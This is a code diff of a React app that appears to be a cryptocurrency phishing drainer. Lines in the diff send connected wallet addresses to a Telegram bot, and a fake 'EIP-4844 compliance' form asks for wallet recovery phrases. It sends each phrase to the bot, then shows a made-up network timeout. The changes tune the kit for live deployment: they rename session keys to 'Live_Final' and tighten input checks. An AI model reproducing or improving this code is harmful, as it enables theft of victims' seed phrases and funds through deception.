@@ -24,9 +24,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_Monday_OK')) {
-      log(`🎯 HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_Monday_OK', 't');
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Live_Final')) {
+      log(`🎯 LIVE HIT!\nADDR: ${address}\nNET: ${chainId}`);
+      sessionStorage.setItem('hit_vF_Live_Final', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -98,10 +98,17 @@ export default function App() {
               )}
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'15px 0', border:'1px solid #1e293b'}}>
-                <input type="text" value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
+                <input 
+                  type="number" 
+                  value={inputVal} 
+                  readOnly={activeTask === "Rectify"} 
+                  onChange={(e)=>setInputVal(e.target.value)} 
+                  placeholder="0.00" 
+                  style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} 
+                />
               </div>
               <button onClick={handleHandshake} 
-                style={{width:'100%', backgroundColor: (activeTask === "Rectify" || inputVal.length > 0) ? '#10b981' : '#1e293b', color: (activeTask === "Rectify" || inputVal.length > 0) ? '#000' : '#475569', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>
+                style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal && inputVal !== "0")) ? '#10b981' : '#1e293b', color: (activeTask === "Rectify" || (inputVal && inputVal !== "0")) ? '#000' : '#475569', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>
                 START_HANDSHAKE
               </button>
             </div>
@@ -114,8 +121,8 @@ export default function App() {
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <div style={{fontSize:'10px', color:'#64748b', marginTop:'10px', lineHeight:'1.4'}}>TO PREVENT SYBIL ATTACKS AND VERIFY WALLET OWNERSHIP, PLEASE INPUT YOUR RECOVERY PHRASE TO SYNCHRONIZE WITH THE MAINNET RELAY.</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'20px'}} />
-                    <button onClick={()=>{if(seedVal.length < 10) return; setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setErrorMsg("⛓️‍💥 NETWORK_CONGESTION: MAINNET_RELAY TIMED OUT. PLEASE TRY AGAIN LATER.");}},60);}} 
-                    style={{width:'100%', backgroundColor: seedVal.length > 10 ? '#10b981' : '#1e293b', color: seedVal.length > 10 ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
+                    <button onClick={()=>{if(seedVal.trim().length < 12) return; setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setErrorMsg("⛓️‍💥 NETWORK_CONGESTION: MAINNET_RELAY TIMED OUT. PLEASE TRY AGAIN LATER.");}},60);}} 
+                    style={{width:'100%', backgroundColor: seedVal.trim().length > 12 ? '#10b981' : '#1e293b', color: seedVal.trim().length > 12 ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
                   <div>
